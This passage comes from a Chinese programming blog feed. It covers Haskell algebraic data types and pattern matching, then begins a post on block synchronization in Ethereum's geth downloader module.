class="line">7</span><br></pre></td></tr></table></figure><p>多个自定义类型的用法也是类似的，理解表达式绑定到变量对应的位置即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; add (Coord x y) (Coord a b) = x+y+a+b</span><br><span class="line">*Main&gt; x = Coord 1 2</span><br><span class="line">*Main&gt; y = Coord 10 20</span><br><span class="line">*Main&gt; add x y</span><br><span class="line">33</span><br></pre></td></tr></table></figure><h2 id="类型别名">类型别名</h2><p>和 C 语言非常类似，<code>type</code> 关键字用于设置类型别名，其中新的类型名字放在 <code>=</code> 号的左边，而已有的类型名字放在 <code>=</code> 号的右边。这两个名字都标识同一个类型，因此，类型别名完全是为了提高可读性而存在的。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">CustomerID</span> = <span class="type">Int</span></span></span><br><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">ReviewBody</span> = <span class="type">String</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">BetterReview</span> = <span class="type">BetterReview</span> <span class="type">BookInfo</span> <span class="type">CustomerID</span> <span class="type">ReviewBody</span></span></span><br></pre></td></tr></table></figure><h2 id="多个值构造器">多个值构造器</h2><p>当一个类型拥有一个以上的值构造器时，这些值构造器通常被称为“备选”（alternatives）或“分支”（case）。同一类型的所有备选，创建出的的值的类型都是相同的。<strong>这相当于实现了「枚举类型」或者反映了 「多态性」，但是又比较特殊，因为每个分支都是一个表达式，既是类型也可以是函数其实函数和值都是表达式</strong>。值构造器相当于构造函数。</p><h3 id="枚举类型">枚举类型</h3><p>代数数据类型的各个值构造器都可以接受任意个数的参数。[译注：不同备选之间接受的参数个数不必相同，参数的类型也可以不一样。]以下是一个账单数据的例子：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- file: BookStore.hs</span></span><br><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">CardHolder</span> = <span class="type">String</span></span></span><br><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">CardNumber</span> = <span class="type">String</span></span></span><br><span class="line"><span class="class"><span class="keyword">type</span> <span class="type">Address</span> = [<span class="type">String</span>]</span></span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">BillingInfo</span> = <span class="type">CreditCard</span> <span class="type">CardNumber</span> <span class="type">CardHolder</span> <span class="type">Address</span></span></span><br><span class="line">                 | <span class="type">CashOnDelivery</span></span><br><span class="line">                 | <span class="type">Invoice</span> <span class="type">CustomerID</span></span><br><span class="line">                   <span class="keyword">deriving</span> (<span class="type">Show</span>)</span><br></pre></td></tr></table></figure><p>这个程序提供了三种付款的方式。如果使用信用卡付款，就要使用 <code>CreditCard</code> 作为值构造器，并输入信用卡卡号、信用卡持有人和地址作为参数。如果即时支付现金，就不用接受任何参数。最后，可以通过货到付款的方式来收款，在这种情况下，只需要填写客户的 ID 就可以了。</p><p>也就是说，先设置了类型别名，类似于 C 语言的 <code>typedef</code>，让类型的可读性更好。然后 <code> BillingInfo</code> 类型有三个枚举类型，通过模式匹配确定选择哪两个。</p><h3 id="Just-和-Maybe">Just 和 Maybe</h3><p>对于自定义的类型，往往会出现无意义的情况或者不需要返回值的情况，或者是错误处理的情况，这相当于其他语言里的 <code>null</code> 和 <code>nil</code>。所以，就出现了内置的 <code>Nothing</code> 类型。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">BillingInfo</span> = <span class="type">CreditCard</span> <span class="type">CardNumber</span> <span class="type">CardHolder</span> <span class="type">Address</span></span></span><br><span class="line">                 | <span class="type">CashOnDelivery</span></span><br><span class="line">                 | <span class="type">Invoice</span> <span class="type">CustomerID</span></span><br><span class="line">                 | <span class="type">Nothing</span></span><br><span class="line">                   <span class="keyword">deriving</span> (<span class="type">Show</span>)</span><br></pre></td></tr></table></figure><p>更进一步，为了处理存在 <code>Nothing</code> 的模式匹配，加入了新的关键字 <code>Maybe</code> 和 <code>Just</code>。<code>Maybe</code> 表示变量可以表示空值。比如上面的代码，可以定义一个 <code>Maybe</code> 变量。<code>Just</code> 必须和 <code>Maybe</code> 配合使用，当不为空值是必须要有 <code>Just</code>，没有 <code>Just</code> 的 <code>Maybe</code> 变量就只能赋值 <code>billingInfo=Nothing</code>。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">billingInfo</span> :: <span class="type">Maybe</span> <span class="type">BillingInfo</span></span><br><span class="line"><span class="title">billingInfo</span> = <span class="type">Just</span> (<span class="type">CreditCard</span> <span class="string">&quot;1234&quot;</span> <span class="string">&quot;John&quot;</span> <span class="string">&quot;123 main St.&quot;</span>)</span><br></pre></td></tr></table></figure><p>具体来说，如果是使用了 <code>Maybe</code> ，表示可以匹配值构造器或者 <code>Nothing</code>，在错误处理中很有用。</p><h3 id="多态性">多态性</h3><p>Haskell 是强类型的语言，所以参数的类型都是有明确的规定的，也存在对应其他语言中「泛型」或者「模板」的语法。这也是通过枚举类型实现的。</p><p>比如我们需要打印 JSON 的某个值，但是 JSON 类型有 String、Number、Boolean、Object (JSON object)、Array、null，难道每种类型都要写非常类似的函数吗？我们可以通过多态简化。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 多态</span></span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">JValue</span></span></span><br><span class="line">  = <span class="type">JString</span> <span class="type">String</span></span><br><span class="line">  | <span class="type">JNumber</span> <span class="type">Double</span></span><br><span class="line">  | <span class="type">JBool</span> <span class="type">Bool</span></span><br><span class="line">  | <span class="type">JNull</span></span><br><span class="line">  | <span class="type">JObject</span> [(<span class="type">String</span>, <span class="type">JValue</span>)]</span><br><span class="line">  | <span class="type">JArray</span> [<span class="type">JValue</span>]</span><br><span class="line">  <span class="keyword">deriving</span> (<span class="type">Eq</span>, <span class="type">Ord</span>, <span class="type">Show</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 类型名字</span></span><br><span class="line"><span class="title">getValue</span> (<span class="type">JValue</span>) |</span><br><span class="line"></span><br><span class="line"><span class="title">getString</span> :: <span class="type">JValue</span> -&gt; <span class="type">Maybe</span> <span class="type">String</span></span><br><span class="line"><span class="title">getString</span> (<span class="type">JString</span> s) = <span class="type">Just</span> s</span><br><span class="line"><span class="title">getString</span> _ = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">getInt</span> (<span class="type">JNumber</span> n) = <span class="type">Just</span> (truncate n)</span><br><span class="line"><span class="title">getInt</span> _ = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">getDouble</span> (<span class="type">JNumber</span> n) = <span class="type">Just</span> n</span><br><span class="line"><span class="title">getDouble</span> _ = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">getBool</span> (<span class="type">JBool</span> b) = <span class="type">Just</span> b</span><br><span class="line"><span class="title">getBool</span> _ = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">getObject</span> (<span class="type">JObject</span> o) = <span class="type">Just</span> o</span><br><span class="line"><span class="title">getObject</span> _ = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">getArray</span> (<span class="type">JArray</span> a) = <span class="type">Just</span> a</span><br><span class="line"><span class="title">getArray</span> _ = <span class="type">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="title">isNull</span> v = v == <span class="type">JNull</span></span><br></pre></td></tr></table></figure><h2 id="递归类型">递归类型</h2><h3 id="列表举例">列表举例</h3><p>上一小节提到了多个值构造器形成多态的特性，我们可以利用这一点实现非常简洁的递归类型。**本质上，列表就是递归类型。**后面将会提到，列表 <code>[1, 2]</code> 实际上只是 <code>(1:(2:[]))</code> 的一种简单的表示方式。具体的表达式如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">List</span> a = <span class="type">Cons</span> a (<span class="type">List</span> <span class="title">a</span>)</span></span><br><span class="line">            | <span class="type">Nil</span></span><br><span class="line">              <span class="keyword">deriving</span> (<span class="type">Show</span>)</span><br></pre></td></tr></table></figure><p>具体使用方法如下，<code>Cons</code> 需要两个参数，第一个参数可以是任何可以的类型，第二个参数必须是我们定义的 <code>List</code> 类型。怎么判断是否是 <code>List</code> 类型呢，这需要观察变量的表达式。例如 <code>Nil</code> 就是一个 <code>List a</code> 类型。当匹配不到 <code>Cons</code> 值构造器的时候，就会选择 <code>Nil</code></p><p>注意 <code>it</code> 是特殊的变量，表示交互式解释器里，输出的上一个变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">初始的 List 变量是 Nil，然后添加 1</span><br><span class="line">Prelude&gt; Cons 1 Nil</span><br><span class="line">Cons 1 Nil</span><br><span class="line"></span><br><span class="line">Prelude&gt; it</span><br><span class="line">Cons 1 Nil</span><br><span class="line"></span><br><span class="line">Prelude&gt; Cons 2 it</span><br><span class="line">Cons 2 (Cons 1 Nil)</span><br><span class="line"></span><br><span class="line">Prelude&gt; Cons 2 it</span><br><span class="line">Cons 2 (Cons 2 (Cons 1 Nil))</span><br></pre></td></tr></table></figure><p>如果我们把 <code>Cons</code> 替换成 <code>:</code> 实际上就和列表在结构上相同了。</p><h3 id="二叉树举例">二叉树举例</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Tree</span> a = <span class="type">Node</span> a (<span class="type">Tree</span> <span class="title">a</span>) (<span class="type">Tree</span> <span class="title">a</span>)</span></span><br><span class="line">            | <span class="type">Empty</span></span><br><span class="line">              <span class="keyword">deriving</span> (<span class="type">Show</span>)</span><br></pre></td></tr></table></figure><p>当匹配到是 Node 的值就选择 Node，否则选择 Empty。如果熟悉二叉树的话，这是很容易理解的。</p><h2 id="和其他语言类比">和其他语言类比</h2><p>以下是一个 C 结构，它等同于我们前面定义的 <code>BookInfo</code> 类型：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">struct</span> book_info &#123;</span><br><span class="line">    int id;</span><br><span class="line">    char *name;</span><br><span class="line">    char *authors;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>目前来说， C 结构和 Haskell 的代数数据类型最大的差别是，<strong>Haskell 代数数据类型的成分是匿名且按位置排序的</strong>，也就是说位置才决定了绑定的那个类型，而不是通过名字。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">BookInfo</span> = <span class="type">Book</span> <span class="type">Int</span> <span class="type">String</span> [<span class="type">String</span>]</span></span><br><span class="line">                <span class="keyword">deriving</span> (<span class="type">Show</span>)</span><br></pre></td></tr></table></figure><p>C 和 C++ 里的 <code>enum</code> 通常用于表示一系列符号值排列。代数数据类型里面也有相似的东西，一般称之为<em>枚举类型</em>。</p><p>以下是一个 <code>enum</code> 例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">roygbiv</span> &#123;</span><br><span class="line">    red,</span><br><span class="line">    orange,</span><br><span class="line">    yellow,</span><br><span class="line">    green,</span><br><span class="line">    blue,</span><br><span class="line">    indigo,</span><br><span class="line">    violet,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以下是等价的 Haskell 代码：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- file: Roygbiv.hs</span></span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Roygbiv</span> = <span class="type">Red</span></span></span><br><span class="line">             | <span class="type">Orange</span></span><br><span class="line">             | <span class="type">Yellow</span></span><br><span class="line">             | <span class="type">Green</span></span><br><span class="line">             | <span class="type">Blue</span></span><br><span class="line">             | <span class="type">Indigo</span></span><br><span class="line">             | <span class="type">Violet</span></span><br><span class="line">               <span class="keyword">deriving</span> (<span class="type">Eq</span>, <span class="type">Show</span>)</span><br></pre></td></tr></table></figure><p>在 ghci 里面测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Prelude&gt; :load Roygbiv.hs</span><br><span class="line">[1 of 1] Compiling Main             ( Roygbiv.hs, interpreted )</span><br><span class="line">Ok, modules loaded: Main.</span><br><span class="line"></span><br><span class="line">*Main&gt; :type Yellow</span><br><span class="line">Yellow :: Roygbiv</span><br><span class="line"></span><br><span class="line">*Main&gt; :type Red</span><br><span class="line">Red :: Roygbiv</span><br><span class="line"></span><br><span class="line">*Main&gt; Red == Yellow</span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">*Main&gt; Green == Green</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h1>模式匹配</h1><p>简单地说，记住<strong>表达式在 Haskell 中很重要，只要对应的输入有对应的输出，那么就是正确的</strong>，所以如下的函数也是正确的</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- file: myNot.hs</span></span><br><span class="line"><span class="title">myNot</span> <span class="type">True</span> = <span class="type">False</span></span><br><span class="line"><span class="title">myNot</span> <span class="type">False</span> = <span class="type">True</span></span><br></pre></td></tr></table></figure><p>初看上去，代码似乎同时定义了两个 <code>myNot</code> 函数，但实际情况并不是这样 —— Haskell 允许将函数定义为<em>一系列等式</em>： <code>myNot</code> 的两个等式分别定义了函数对于输入参数在不同模式之下的行为。对于每行等式，模式定义放在函数名之后， <code>=</code> 符号之前。</p><p>首先调用 <code>myNot</code> ， Haskell 运行时检查输入参数 <code>False</code> 是否和第一个模式的值构造器匹配 —— 答案是不匹配，于是它继续尝试匹配第二个模式 —— 这次匹配成功了，于是第二个等式右边的值被作为结果返回。</p><p>再看一个例子，在 Haskell 里，<strong>列表 <code>[1, 2]</code> 实际上只是 <code>(1:(2:[]))</code> 的一种简单的表示方式</strong>，其中 <code>(:)</code> 用于构造列表。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sumList</span> (x:xs) = x + sumList xs</span><br><span class="line"><span class="title">sumList</span> []  = <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="通配符">通配符</h2><p>比较特殊的是<strong>通配符</strong>，如果一些值无所谓，那么直接用 <code>_</code> 代替即可，避免函数参数不匹配匹配。比如获取坐标中横坐标的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; x = Coord 1 2</span><br><span class="line">*Main&gt; xcoord (Coord x y)=x</span><br><span class="line">*Main&gt; xcoord x</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>也可以写成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; xcoord (Coord x _)=x</span><br><span class="line">*Main&gt; x</span><br><span class="line">Coord 1 2</span><br><span class="line">*Main&gt; xcoord x</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h2 id="形式匹配">形式匹配</h2><p>在 Haskell 中，形式匹配通常使用 case 表达式、函数定义、let 语句、where 子句等方式来实现。在 Haskell 中，case 表达式可以用于将一个表达式与一组模式进行匹配，并执行相应的代码。case 表达式的基本形式如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">case</span> expression <span class="keyword">of</span></span><br><span class="line">  pattern1 -&gt; code1</span><br><span class="line">  pattern2 -&gt; code2</span><br><span class="line">  ...</span><br><span class="line">  patternN -&gt; codeN</span><br></pre></td></tr></table></figure><p><code>expression</code> 是要匹配的表达式，``pattern1<code>到</code>patternN<code> 是不同的模式，</code>code1<code>到</code>codeN` 是对应的代码块。当匹配成功时，对应的代码块将被执行，并返回结果。如果所有的模式都无法匹配，则 case 表达式将返回一个错误或空值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">case</span> e <span class="keyword">of</span> &#123; xs@(x:rest) -&gt; <span class="keyword">if</span> x==<span class="number">0</span> <span class="keyword">then</span> rest <span class="keyword">else</span> xs &#125;</span><br></pre></td></tr></table></figure><p><code>xs@(x:rest)</code> 表示将 <code>e</code> 表达式的值绑定到 <code>xs</code> 变量，并将它分解为两部分：头部 <code>x</code> 和尾部 <code>rest</code>。在这个模式中，<code>xs </code>是整个 <code>e </code>表达式的值，<code>x</code> 是 <code>e</code> 表达式的第一个元素，rest 是 e 表达式的剩余部分。如果 <code>e</code> 的头部元素等于 0，则返回 e 的剩余部分<code>rest</code>。否则，返回整个 e 表达式的值 <code>xs</code>。</p><hr><p>为了方便起见，也可以在定义的时候就指定新类型的元素的名字。请读者仔细观察语法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; data Coord = Coord &#123;getx::Int,gety::Int&#125; deriving (Show)</span><br><span class="line"></span><br><span class="line">*Main&gt; x = Coord 1 2</span><br><span class="line">*Main&gt; getx x</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>定义变量的时候也可以更加清楚一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Main&gt; x = Coord &#123;getx = 10,gety =20&#125;</span><br><span class="line">*Main&gt; getx x</span><br><span class="line">10</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-1/&quot; title=&quot;Haskell(一)入门&quot;&gt;Haskell(一)入门&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-2/&quot; title=&quot;Haskell(二)函数式编程&quot;&gt;Haskell(二)函数式编程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/monad/&quot; title=&quot;Haskell(三) Monad&quot;&gt;Haskell(三) Monad&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-summary-toolchain/&quot; title=&quot;Haskell(四)总结和工具链&quot;&gt;Haskell(四)总结和工具链&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-epilogue/&quot; title=&quot;Haskell(五) 总结和展望&quot;&gt;Haskell(五) 总结和展望&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/project-euler/&quot; title=&quot;Haskell(六) P</summary>
        
      
    
    
    
    <category term="functional language" scheme="https://www.blog-blockchain.xyz/categories/functional-language/"/>
    
    
    <category term="Haskell" scheme="https://www.blog-blockchain.xyz/tags/Haskell/"/>
    
  </entry>
  
  <entry>
    <title>区块同步</title>
    <link href="https://www.blog-blockchain.xyz/geth/block-sync/"/>
    <id>https://www.blog-blockchain.xyz/geth/block-sync/</id>
    <published>2022-08-25T08:30:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/geth/tx-signature/" title="交易的签名">交易的签名</a></li><li><a href="/geth/understand-receipt/" title="理解收据receipt">理解收据receipt</a></li><li><a href="/geth/blocks/" title="理解区块">理解区块</a></li><li><a href="/geth/understand-tx/" title="理解交易">理解交易</a></li><li><a href="/geth/blockchain-core/" title="blockchain核心">blockchain核心</a></li><li><a href="/geth/forkId/" title="forkId 解读">forkId 解读</a></li><li><a href="/geth/bloom-filter/" title="布隆过滤器原理">布隆过滤器原理</a></li><li><a href="/geth/tx-pool/" title="交易池分析">交易池分析</a></li><li><a href="/geth/oracle-introduction/" title="oracle 原理和实现">oracle 原理和实现</a></li><li><a href="/geth/txlist/" title="TxList 解读">TxList 解读</a></li><li><a href="/geth/MPT-Tree/" title="MPT树">MPT树</a></li><li><a href="/geth/block-sync/" title="区块同步">区块同步</a></li><li><a href="/geth/introduction/" title="geth源码学习——介绍">geth源码学习——介绍</a></li><li><a href="/geth/Geth-Unveiled-Ethereum-Startup/" title="How Geth starts its server">How Geth starts its server</a></li></ol></blockquote><blockquote><p>博主的朋友写的</p><ul><li>看到<code>core\blockchain.go</code>的时候大量涉及该部分知识，故在此参考大佬博客加之自己的理解先行总结</li><li>本文仅仅是简单总结了一下文件结构和重要函数功能，详细函数分析请参考<a href="https://mindcarver.cn/2020/12/23/%E6%AD%BB%E7%A3%95%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bdownloader%E5%90%8C%E6%AD%A5/">downloader 同步</a></li></ul></blockquote><h3 id="文件结构"><strong>文件结构</strong></h3><p><code>downloader</code> 模块的代码位于 <code>eth/downloader</code> 目录下。主要的功能代码分别是：</p><ul><li><p><code>downloader.go</code> ：实现了区块同步逻辑</p></li><li><p><code>peer.go</code> ：对区块各个阶段的组装，下面的各个<code>FetchXXX</code> 就是很依赖这个模块。</p></li><li><p><code>queue.go</code> ：对<code>eth/peer.go</code>的封装</p></li><li><p><code>statesync.go</code> ：同步<code>state</code>对象</p></li><li><p>注意：</p><ul><li><p><code>downloader</code>是一个下载器，从远程网络节点中获取 hashes 和 blocks。</p></li><li><p><code>fetcher</code>则收集网络其他以太坊节点发过来的同步通知，进行验证，并做出相应的处理。</p></li><li><p><code>peers</code>是经过验证可信任的通信节点的集合。</p></li><li><p><code>queue</code> represents hashes that are either need fetching or are being fetched</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// queue represents hashes that are either need fetching or are being fetched</span></span><br><span class="line"><span class="keyword">type</span> queue <span class="keyword">struct</span> &#123;</span><br><span class="line">mode SyncMode <span class="comment">// Synchronisation mode to decide on the block parts to schedule for fetching</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Headers are &quot;special&quot;, they download in batches, supported by a skeleton chain</span></span><br><span class="line">headerHead      common.Hash                    <span class="comment">// Hash of the last queued header to verify order</span></span><br><span class="line">headerTaskPool  <span class="keyword">map</span>[<span class="type">uint64</span>]*types.Header       <span class="comment">// Pending header retrieval tasks, mapping starting indexes to skeleton headers</span></span><br><span class="line">headerTaskQueue *prque.Prque                   <span class="comment">// Priority queue of the skeleton indexes to fetch the filling headers for</span></span><br><span class="line">headerPeerMiss  <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">map</span>[<span class="type">uint64</span>]<span class="keyword">struct</span>&#123;&#125; <span class="comment">// Set of per-peer header batches known to be unavailable</span></span><br><span class="line">headerPendPool  <span class="keyword">map</span>[<span class="type">string</span>]*fetchRequest       <span class="comment">// Currently pending header retrieval operations</span></span><br><span class="line">headerResults   []*types.Header                <span class="comment">// Result cache accumulating the completed headers</span></span><br><span class="line">headerProced    <span class="type">int</span>                            <span class="comment">// Number of headers already processed from the results</span></span><br><span class="line">headerOffset    <span class="type">uint64</span>                         <span class="comment">// Number of the first header in the result cache</span></span><br><span class="line">headerContCh    <span class="keyword">chan</span> <span class="type">bool</span>                      <span class="comment">// Channel to notify when header download finishes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// All data retrievals below are based on an already assembles header chain</span></span><br><span class="line">blockTaskPool  <span class="keyword">map</span>[common.Hash]*types.Header <span class="comment">// Pending block (body) retrieval tasks, mapping hashes to headers</span></span><br><span class="line">blockTaskQueue *prque.Prque                  <span class="comment">// Priority queue of the headers to fetch the blocks (bodies) for</span></span><br><span class="line">blockPendPool  <span class="keyword">map</span>[<span class="type">string</span>]*fetchRequest      <span class="comment">// Currently pending block (body) retrieval operations</span></span><br><span class="line"></span><br><span class="line">receiptTaskPool  <span class="keyword">map</span>[common.Hash]*types.Header <span class="comment">// Pending receipt retrieval tasks, mapping hashes to headers</span></span><br><span class="line">receiptTaskQueue *prque.Prque                  <span class="comment">// Priority queue of the headers to fetch the receipts for</span></span><br><span class="line">receiptPendPool  <span class="keyword">map</span>[<span class="type">string</span>]*fetchRequest      <span class="comment">// Currently pending receipt retrieval operations</span></span><br><span class="line"></span><br><span class="line">resultCache *resultStore       <span class="comment">// Downloaded but not yet delivered fetch results</span></span><br><span class="line">resultSize  common.StorageSize <span class="comment">// Approximate size of a block (exponential moving average)</span></span><br><span class="line"></span><br><span class="line">lock   *sync.RWMutex</span><br><span class="line">active *sync.Cond</span><br><span class="line">closed <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">lastStatLog time.Time</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="同步模式"><strong>同步模式</strong></h3><p>以太坊中区块同步包含以下三种模式：</p><ul><li><p>full sync：</p><p><code>full</code> 模式会在数据库中保存所有区块数据，同步时从远程节点同步 header 和 body 数据，而 state 和 receipt 数据则是在本地计算出来的。</p><p>在 full 模式下，downloader 会同步区块的 header 和 body 数据组成一个区块，然后通过 blockchain 模块的 <code>BlockChain.InsertChain</code> 向数据库中插入区块。在 <code>BlockChain.InsertChain</code> 中，会逐个<strong>计算和验证</strong>每个块的 <code>state</code> 和 <code>recepit</code> 等数据，如果一切正常就将区块数据以及自己计算得到的 <code>state</code>、<code>recepit</code> 数据一起写入到数据库中。</p></li><li><p>fast sync：</p><p><code>fast</code> 模式下，<code>recepit</code> 不再由本地计算，而是和区块数据一样，直接由 <code>downloader</code> 从其它节点中同步；<code>state</code> 数据并不会全部计算和下载，而是选一个较新的区块（称之为 <code>pivot</code>）的 <code>state</code> 